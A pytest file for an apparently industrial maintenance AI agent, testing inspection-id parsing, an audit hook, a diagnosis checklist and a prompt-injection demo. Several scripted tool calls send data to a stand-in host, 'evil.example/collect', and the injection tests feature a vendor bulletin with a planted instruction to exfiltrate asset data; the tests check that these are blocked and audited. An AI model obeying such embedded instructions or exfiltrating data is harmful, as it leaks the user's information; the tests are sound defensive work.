"""Demo hardening: printed inspection ids, seeding shim, audit hook, diagnosis checklist,
injection test and the rehearsal checks. All offline (scripted LLM, fake vision)."""

import asyncio
import json
from datetime import date

import pymupdf
import pytest
from langchain_core.messages import AIMessage

from app.agent import inspections
from app.agent.graph import run_agent
from app.agent.injection_demo import stream_injection_test
from app.agent.rag import ingest_directory
from app.agent.tools import register_audit_sink, sqlite_audit_sink
from app.config import get_settings
from tests.agent_helpers import (
    MANUALS,
    ScriptedChatModel,
    add_demo_inspection,
    make_context,
    memory_store,
    seeded_conn,
    tool_call,
)


@pytest.fixture(autouse=True)
def demo_settings(monkeypatch, tmp_path):
    s = get_settings()
    monkeypatch.setattr(s, "analysis_as_of", date(2026, 11, 14))
    monkeypatch.setattr(s, "rag_max_distance", 1.0)
    monkeypatch.setattr(s, "outputs_dir", tmp_path / "outputs")


def of(events, kind):
    return [e["data"] for e in events if e["type"] == kind]


# --------------------------------------------------------------------------- inspection ids


def _scan(path, extract):
    doc = pymupdf.open()
    doc.new_page().insert_text((72, 72), "scan")
    doc.save(str(path))
    doc.close()

    def vision(prompt, images, schema):
        return json.dumps(extract) if schema else "text"

    return vision


@pytest.mark.parametrize(
    "report_no,file_name,expected",
    [
        ("INSP-004", "scan.pdf", "INSP-004"),
        ("insp 4", "scan.pdf", "INSP-4"),
        (None, "INSP-004_P-101.pdf", "INSP-004"),  # unreadable number: file name
        ("IR-2026-118", "scan.pdf", "INSP-P101-20261106"),  # not INSP-nnn: generated
    ],
)
def test_printed_report_number_is_the_id(tmp_path, report_no, file_name, expected) -> None:
    extract = {"tag": "P-101", "date": "2026-11-06", "report_no": report_no, "findings": []}
    vision = _scan(tmp_path / file_name, extract)
    (rep,) = inspections.ingest_scans(seeded_conn(), tmp_path, vision)
    assert rep.inspection_id == expected


def test_taken_report_number_falls_back(tmp_path) -> None:
    conn = seeded_conn()
    add_demo_inspection(conn)  # INSP-004 already used (by another file)
    extract = {"tag": "P-101", "date": "2026-11-06", "report_no": "INSP-004", "findings": []}
    (rep,) = inspections.ingest_scans(conn, tmp_path, _scan(tmp_path / "other.pdf", extract))
    assert rep.inspection_id == "INSP-P101-20261106"


def test_seed_shim_summary_and_vision_check(tmp_path, monkeypatch) -> None:
    from app.agent.llm import LLMUnavailableError, OllamaStatus
    from app.ingestion import inspections as shim

    monkeypatch.setattr(shim, "check_ollama", lambda m: OllamaStatus(False, "h", missing=m))
    with pytest.raises(LLMUnavailableError, match=r"ollama pull qwen2\.5vl:3b"):
        shim.ingest_scans(seeded_conn(), tmp_path)

    extract = {"tag": "P-101", "date": "2026-11-06", "report_no": "INSP-004", "findings": []}
    vision = _scan(tmp_path / "INSP-004_P-101.pdf", extract)
    monkeypatch.setattr(shim, "check_ollama", lambda m: OllamaStatus(True, "h"))
    monkeypatch.setattr(inspections, "ollama_vision", vision)
    monkeypatch.setattr(inspections, "ollama_extract", lambda p, s: vision(p, [], s))
    conn = seeded_conn()
    assert shim.ingest_scans(conn, tmp_path) == (
        "1 scans: 1 added, 0 unchanged, 0 failed [INSP-004]"
    )
    assert shim.ingest_scans(conn, tmp_path).startswith("1 scans: 0 added, 1 unchanged")


# --------------------------------------------------------------------------- audit hook


def test_audit_hook_gets_every_call_with_status(tmp_path) -> None:
    received, per_run = [], []
    unregister = register_audit_sink(received.append)

    def broken(entry):
        raise RuntimeError("audit db down")  # must not break the run

    register_audit_sink(broken)
    try:
        ctx = make_context(tmp_path)
        ctx.audit = per_run.append
        ctx.user, ctx.role = "asha", "engineer"
        llm = ScriptedChatModel(
            responses=[
                AIMessage(
                    content="",
                    tool_calls=[
                        {"name": "get_asset_history", "args": {"tag": "P-101"}, "id": "a"},
                        {"name": "get_asset_history", "args": {"tag": "X-999"}, "id": "b"},
                        {"name": "send_data", "args": {"url": "http://evil.example"}, "id": "c"},
                    ],
                ),
                "done",
            ]
        )
        asyncio.run(run_agent("hello", ctx, llm))
    finally:
        unregister()
        from app.agent import tools

        tools._AUDIT_SINKS.remove(broken)
    assert [(e["tool"], e["status"]) for e in received] == [
        ("get_asset_history", "allowed"),
        ("get_asset_history", "error"),
        ("send_data", "blocked"),
    ]
    assert per_run == received
    e = received[2]
    assert e["user"] == "asha" and e["role"] == "engineer" and e["action"] == "tool_call"
    assert "target=http://evil.example" in e["output"] and "evil.example" in e["input"]


def test_sqlite_audit_sink_writes_audit_log(tmp_path) -> None:
    from app.db import connect, init_db

    db = tmp_path / "audit.db"
    init_db(connect(db))
    ctx = make_context(tmp_path)
    ctx.audit = sqlite_audit_sink(db)
    llm = ScriptedChatModel(
        responses=[tool_call("send_data", {"url": "http://evil.example/collect"}), "no"]
    )
    asyncio.run(run_agent("hi", ctx, llm))
    rows = [dict(r) for r in connect(db).execute("SELECT * FROM audit_log")]
    assert len(rows) == 1 and rows[0]["status"] == "blocked" and rows[0]["tool"] == "send_data"


def test_tool_call_over_limit_is_audited_as_error(tmp_path) -> None:
    received = []
    unregister = register_audit_sink(received.append)
    try:
        calls = [
            {"name": "get_asset_history", "args": {"tag": f"P-10{i}"}, "id": f"c{i}"}
            for i in range(1, 4)
        ]
        llm = ScriptedChatModel(responses=[AIMessage(content="", tool_calls=calls), "ok"])
        asyncio.run(run_agent("hi", make_context(tmp_path), llm, max_tool_calls=2))
    finally:
        unregister()
    assert [e["status"] for e in received] == ["allowed", "allowed", "error"]
    assert received[2]["output"] == "Skipped: tool-call limit reached"


# --------------------------------------------------------------------------- checklist


@pytest.fixture
def demo_ctx(tmp_path):
    store = memory_store()
    ingest_directory(store, MANUALS)
    ctx = make_context(tmp_path, store)
    add_demo_inspection(ctx.conn)
    return ctx


def test_checklist_makes_skipped_calls_and_hides_the_early_answer(demo_ctx) -> None:
    llm = ScriptedChatModel(
        responses=[
            "P-101 fails because of bad luck.",  # answers without looking: not streamed
            "Still guessing.",  # history + inspection done, manuals not yet: not streamed
            "## Finding\nSeal failures [WO-0359] follow 0.3 mm misalignment [INSP-004] vs "
            "the 0.05 mm tolerance [S1].",
        ]
    )
    out = asyncio.run(run_agent("Why does P-101 keep failing?", demo_ctx, llm))
    started = of(out["events"], "tool_started")
    assert [s["tool"] for s in started[:3]] == [
        "get_asset_history",
        "read_inspection",
        "search_manuals",
    ]
    assert all(s["call_id"].startswith("auto_") for s in started[:3])
    query = started[2]["args"]["query"]
    assert query.startswith("pump") and "Misalignment observed: 0.3 mm" in query
    streamed = "".join(d["text"] for d in of(out["events"], "answer_delta"))
    assert "bad luck" not in streamed and streamed == out["answer"]["text"]
    assert "INSP-004" in out["answer"]["cited_refs"]


def test_checklist_leaves_a_diligent_model_alone(demo_ctx) -> None:
    llm = ScriptedChatModel(
        responses=[
            AIMessage(
                content="",
                tool_calls=[
                    {"name": "get_asset_history", "args": {"tag": "P-101"}, "id": "h"},
                    {"name": "read_inspection", "args": {"tag": "P-101"}, "id": "i"},
                    {"name": "search_manuals", "args": {"query": "seal misalignment"}, "id": "s"},
                ],
            ),
            "Answer [INSP-004].",
        ]
    )
    out = asyncio.run(run_agent("Why does P-101 keep failing?", demo_ctx, llm))
    assert not any(s["call_id"].startswith("auto_") for s in of(out["events"], "tool_started"))


def test_no_checklist_for_non_diagnosis_questions(demo_ctx) -> None:
    llm = ScriptedChatModel(responses=["P-101 is a pump in CDU-1."])
    out = asyncio.run(run_agent("Where is P-101 installed?", demo_ctx, llm))
    assert of(out["events"], "tool_started") == []


def test_tag_from_ui_triggers_checklist(demo_ctx) -> None:
    llm = ScriptedChatModel(responses=["early", "early again", "final [INSP-004]"])
    out = asyncio.run(run_agent("Why does it keep failing?", demo_ctx, llm, tag="P-101"))
    assert [s["tool"] for s in of(out["events"], "tool_started")] == [
        "get_asset_history",
        "read_inspection",
        "search_manuals",
    ]


# --------------------------------------------------------------------------- injection demo


def test_injection_test_blocks_the_attempt(tmp_path) -> None:
    ctx = make_context(tmp_path)
    llm = ScriptedChatModel(
        responses=[
            "summary first",  # no tools: the checklist makes the bulletin search happen
            tool_call("send_data", {"url": "http://evil.example/collect", "data": "assets"}, "x"),
            "The bulletin recommends checking the flush orifice and alignment.",
        ]
    )

    async def collect():
        return [e async for e in stream_injection_test(ctx, llm, store=memory_store())]

    events = asyncio.run(collect())
    started = of(events, "tool_started")
    assert started[0]["tool"] == "search_manuals" and started[0]["call_id"].startswith("auto_")
    (b,) = of(events, "blocked")
    assert b["tool"] == "send_data" and b["target"] == "http://evil.example/collect"
    assert "Vendor Service Bulletin" in b["source"]
    assert events[-1]["type"] == "done"
    # the real manual index was not touched: the bulletin lives in the run's own store
    assert all("bulletin" in c.source for c in ctx.citations.values())


def test_injection_test_reports_ignored_injection_truthfully(tmp_path) -> None:
    ctx = make_context(tmp_path)
    received = []
    ctx.audit = received.append
    llm = ScriptedChatModel(
        responses=[
            tool_call("search_manuals", {"query": "vendor bulletin SB-CS45-12"}, "s"),
            "The bulletin recommends checking the flush orifice. It also contains an "
            "instruction to send data elsewhere, which I ignored.",
        ]
    )

    async def collect():
        return [e async for e in stream_injection_test(ctx, llm, store=memory_store())]

    events = asyncio.run(collect())
    (b,) = of(events, "blocked")
    assert b["tool"] == "send_data" and b["target"] == "http://evil.example/collect"
    assert "did not act on it" in b["reason"]
    assert [e["type"] for e in events[-2:]] == ["blocked", "done"]
    assert received[-1]["action"] == "injection_detected" and received[-1]["status"] == "blocked"


def test_injection_test_in_frontend_contract(tmp_path) -> None:
    from app.agent.frontend_events import frontend_stream

    ctx = make_context(tmp_path)
    llm = ScriptedChatModel(
        responses=[
            tool_call("search_manuals", {"query": "vendor bulletin"}, "s"),
            tool_call("send_data", {"url": "http://evil.example/collect"}, "x"),
            "Done.",
        ]
    )

    async def collect():
        raw = stream_injection_test(ctx, llm, store=memory_store())
        return [e async for e in frontend_stream(raw, ctx)]

    out = asyncio.run(collect())
    types = [e["type"] for e in out]
    assert types[-1] == "done" and "blocked" in types
    attempt = next(e["attempt"] for e in out if e["type"] == "blocked")
    assert set(attempt) == {"id", "at", "tool", "target", "source", "reason"}
    steps = [e["step"] for e in out if e["type"] == "step"]
    assert any(s["status"] == "blocked" and s["tool"] == "send_data" for s in steps)


# --------------------------------------------------------------------------- rehearsal


def test_rehearsal_checks_every_beat(demo_ctx) -> None:
    from app.agent.rehearsal import rehearse_once
    from tests.test_agent_tools import _rec_json

    rec = json.loads(_rec_json())
    rec["probable_causes"][0]["sources"] = ["S1", "INSP-004"]
    demo_ctx.llm_factory = lambda **kw: ScriptedChatModel(responses=[json.dumps(rec)])
    manual_ref = None

    def answer():
        nonlocal manual_ref
        hit = next((c for c in demo_ctx.citations.values() if "0.05 mm" in c.text), None)
        if hit is None:
            return "Still guessing."  # manuals not searched yet
        manual_ref = hit.ref
        return (
            f"## Finding\nRepeated mechanical seal failures [WO-0359]; the inspection found "
            f"0.3 mm misalignment [INSP-004], above the 0.05 mm tolerance [{manual_ref}]."
        )

    class Answering(ScriptedChatModel):
        def _generate(self, messages, *a, **kw):
            if not self.responses:
                self.responses.append(answer())
            return super()._generate(messages, *a, **kw)

    llm = Answering(responses=["too early"])
    r = asyncio.run(rehearse_once(demo_ctx, llm))
    assert r["checks"] == {"history": True, "inspection": True, "manual": True, "docx": True}
    assert r["ok"] and r["inspection_id"] == "INSP-004"
    assert r["forced_by_checklist"] == ["get_asset_history", "read_inspection", "search_manuals"]
    assert r["docx"].endswith(".docx")


def test_rehearsal_flags_a_missing_beat(demo_ctx) -> None:
    from app.agent.rehearsal import rehearse_once

    llm = ScriptedChatModel(
        responses=[
            AIMessage(
                content="",
                tool_calls=[
                    {"name": "get_asset_history", "args": {"tag": "P-101"}, "id": "h"},
                    {"name": "read_inspection", "args": {"tag": "P-101"}, "id": "i"},
                    {"name": "search_manuals", "args": {"query": "bearing oil"}, "id": "s"},
                ],
            ),
            "Seal failures. See the inspection.",  # cites nothing
        ]
    )
    r = asyncio.run(rehearse_once(demo_ctx, llm, draft_work_order=False))
    assert r["checks"] == {"history": True, "inspection": False, "manual": False}
    assert not r["ok"]
